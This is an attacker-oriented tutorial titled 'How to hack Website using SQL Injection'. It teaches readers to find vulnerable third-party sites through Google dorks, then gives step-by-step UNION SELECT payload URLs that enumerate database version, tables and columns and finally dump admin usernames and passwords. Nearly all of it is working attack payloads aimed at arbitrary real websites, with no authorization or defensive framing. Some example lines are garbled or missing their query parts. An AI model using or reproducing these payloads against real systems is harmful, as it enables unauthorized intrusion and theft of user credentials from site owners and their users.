How to hack Website using SQL Injection ?
This is our first tutorial on website hacking using
SQL Injection attack with easy and simple steps. We have seen many guys , they can't
understand SQL Injection method because it's really very hard to understand and Inject Malicious
code into URL and get website Database, So here we created SQL Injection tutorial with easy and
understandable steps . Hope you all will like it.
✔ What is SQL Injection ?
SQL Injection is one the most popular Web application hacking method. In SQL Injection an
attacker find website vulnerability (Vulnerability means Weakness point of a website) and Inject
Malicious code into URL and get Database of Website and Hack the website this is called SQL
Injection attack Exploiting DB (Database) and also SQL Injection Vulnerability Exploitation.
Using SQL Injection attack method an attacker can get complete DB of website and User ID and
Password can be exploded, an attacker can also Shut down My SQL Server and Server will stop
working. An attacker can modify content of website and bypass login.
✔ Requirements :-
SQL Injection Dorks.
Vulnerable Website. (Use Google to find SQL Injection Vulnerable Website)
Firefox with Hack bar add-on.
Little bit understanding of SQL Injection and URL
Fresh Mind to Understand it.
✔ Step 1. Find Vulnerable website.
An attacker always use Google, Bing or Yahoo search engine for searching SQL Injection
Vulnerable websites using Dorks. (SQL Injection vulnerable URL is called Dorks which can be
easily found in SQL Injection Vulnerable Website URL)
Search it on Google for Eg. these are few SQL Injection Vulnerable Dorks. :-
___________
inurl:index.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:pageid=
________________
Use Google to search Vulnerable websites.
Acutally what you have to do is , go on google and type :
inurl : index.php?id=1(or 2 or 3 or any number you like)
You will get a list of websites . Choose one .
For Eg. www.targetwebsite.com/index.php?id=8Make sure that at last the URL has some syntax like this : index.php?id=2(or any other
number)
✔ How to Check for Vulnerability.
Open any website URL related to SQL Injection Dorks.
Put Single Quote at the End of the website URL ( ' )
Note :- To Check the Vulnerability put single Quote ( ' ) at the end of the website URL and Hit
Enter.
For Eg. www.targetwebsite.com/index.php?id=2'
If the page remains same or Not found then it's not vulnerable and if the page shows Error like
this :-
An error occurred...
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server
version for the right syntax to use near ''/contentPage.php?id=8''' at line 1
or
An error occurred...
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server
version for the right syntax to use near ''' at line 1
This means the website is vulnerable to SQL Injection.
✔ Step 2. Find the number of Columns.
Woh!! We found SQL Injection Vulnerable webstie now it's time to find no. of Columns present in
the Database.
To do that replace that one single quote ( ' ) with "Order By no." Statement until you find the
Error message.
Change the no. from 1,2,3,4,5,6,7,8,9,..... Until you get an Error Message like "Unknown
Column"
For Example :- Change it's Order By 1,2,3,4 like below :-
www.targetwebsite.com/index.php?id=8
www.targetwebsite.com/index.php?id=8
www.targetwebsite.com/index.php?id=8
www.targetwebsite.com/index.php?id=8
www.targetwebsite.com/index.php?id=8
And Suppose above Method won't work then use below method :-www.targetwebsite.com/index.php?id=8 order by 1--
www.targetwebsite.com/index.php?id=8 order by 2--
www.targetwebsite.com/index.php?id=8 order by 3--
If you get an Error on Order by 9 that means the DB have 8 number of Columns and If you had
found error on Order by 6 then the DB have 5 number of Columns. We mean if you put Order by
12 and Suppose the DB have only 11 no. of Columns then Website will show Error like this :-
An error occurred...
Unknown column '12' in 'order clause'
This trick is actually used to find the number of Columns in DB. Understand the Below example
and you will get to know.
www.targetwebsite.com/index.php?id=8 Order by 1 (No Error)
www.targetwebsite.com/index.php?id=8 Order by 2 (No Error)
www.targetwebsite.com/index.php?id=8 Order by 3 (No Error)
www.targetwebsite.com/index.php?id=8 Order by 4 (No Error)
www.targetwebsite.com/index.php?id=8 Order by 5 (No Error)
www.targetwebsite.com/index.php?id=8 Order by 6 (No Error)
www.targetwebsite.com/index.php?id=8 Order by 7 (No Error)
www.targetwebsite.com/index.php?id=8 Order by 8 (No Error)
www.targetwebsite.com/index.php?id=8 Order by 9 (No Error)
www.targetwebsite.com/index.php?id=8 Order by 10 (No Error)
www.targetwebsite.com/index.php?id=8 Order by 11 (No Error)
www.targetwebsite.com/index.php?id=8 Order by 12 (Error)
Here, our Vulnerable website Showed Error on Order by 12 that means our Vulnerable website
have 11 number of columns in it's DB.
So now here we found number of columns in my DB :-
Number of Columns = 11
✔ Step 3. Find the Vulnerable Column.
Basically if the website is vulnerable then it have vulnerability in it's column and now it's time to
find out that column.
Well we have successfully discovered number of columns present in Database. let us find
Vulnerable Column by using the Query "Union Select columns_sequence".
And also change the ID Value to Negative, we mean Suppose the website have this URL
index.php?id=8 Change it to index.php?id=-8. Just put minus sign "-" before ID value.
For Eg. If the Number of Column is 11 then the query is as follow :-
www.targetwebsite.com/index.php?id=-8 union select 1,2,3,4,5,6,7,8,9,10,11--And Suppose
above Method won't work then use below method:-www.targetwebsite.com/index.php?id=-8 and
1=2 union select 1,2,3,4,5,6,7,8,9,10,11--✔ And Once if the Query has been Executed then it will display the number of Columns.
In the Above result, we found three vulnerable Columns 2,3 and 4.
Let us take 2 as our tutorial.
Well... ! We found Vulnerable Columns, Now Next Step.
✔Step 4. Finding version, Database and User.
Now its time to find out website Database version and User
Just replace Vulnerable Column no. with "version()"
For Eg.
www.targetwebsite.com/index.php?id=-8 union select 1,version(),3,4,5,6,7,8,9,10,11--
And now Hit Enter : and you will get result.
Now again do the same , replace Vulnerable column with different query like :- database(),
user()For Eg.
www.targetwebsite.com/index.php?id=-8 union select 1,version(),3,4,5,6,7,8,9,10,11--
www.targetwebsite.com/index.php?id=-8 union select 1,database(),3,4,5,6,7,8,9,10,11--
www.targetwebsite.com/index.php?id=-8 union select 1,user(),3,4,5,6,7,8,9,10,11--
And Suppose above Method won't work then use below method :-
www.targetwebsite.com/index.php?id=-8 and 1=2 union select
1,unhex(hex(@@version)),3,4,5,6,7,8,9,10,11--
✔ Step 5. Finding the Table name.
Here we found vulnerable Column, DB , Version name and User . Now it's time to get the Table
name.
If the database version is 4 or above then you gave to guess the table name (Blind SQL Injection
attack)
Let us find now Table name of the Database, Same here Replace Vulnerable Column number
with "group_concat(table_name) and add the "from information_schema.tables where
table_schema=database()"
For Eg.
www.targetwebsite.com/index.php?id=-8 union select
1,group_concat(table_name),3,4,5,6,7,8,9,10,11 from information_schema.tables where
table_schema=database()--
Now hit Enter and you can see Complete Table of Database.Great we found Table name now find the table name that is related to admin or user .
When we performed this on our target website we got to know that there is one table name :-
userDatabase. Let us choose that table userdatabase and Go on Next step.
✔ Step 6. Finding the Column name.
Now same to find Column names, replace "group_concat(table_name) with
"group_concat(column_name)"
and Replace the "from information_schema.tables where table_schema=database()--" with
"FROM information_schema.columns WHERE table_name=mysqlchar—
Note :- Do not hit Enter now.... First of all Convert
table name into Mysql Char String()
Install the Hackbar add-on in Firefox
After Installing you can see the toolbar, and if you can't then Hit F9.Select sql->Mysql-
>MysqlChar() in the Hackbar.
Enter the Table name you want to convert it into Mysql Char
Now you can see the Char like this :-
Copy and paste the code at the end of the url instead of the "mysqlchar"
For Eg.
www.targetwebsite.com/index.php?id=-8 union select
1,group_concat(column_name),3,4,5,6,7,8,9,10,11 FROM information_schema.columns WHERE
table_name=CHAR(117, 115, 101, 114, 68, 97, 116, 97, 98, 97, 115, 101)--
And Now Hit Enter and you will be able to see the Column names .
Great Here we found Username and Password Column .
✔ Step 7. Explore Database & Hack it.
Cool......! Now you know the next step what to do ..... get the ID and Password of Admin user
using this Command into URL.Now replace group_concat(column_name) with
group_concat(username,0x2a,password). or any other Column name you want to get Data.For Eg.
http://targetwebsite.com/index.php?id=-8 and 1=2 union select
1,group_concat(username,0x2a,password),3,4,5,6,7,8,9,10,11 from userDatabase—
If the above Command doesn't work then use Column name from first and put all Columns at one
time and you will be able to get the complete database.
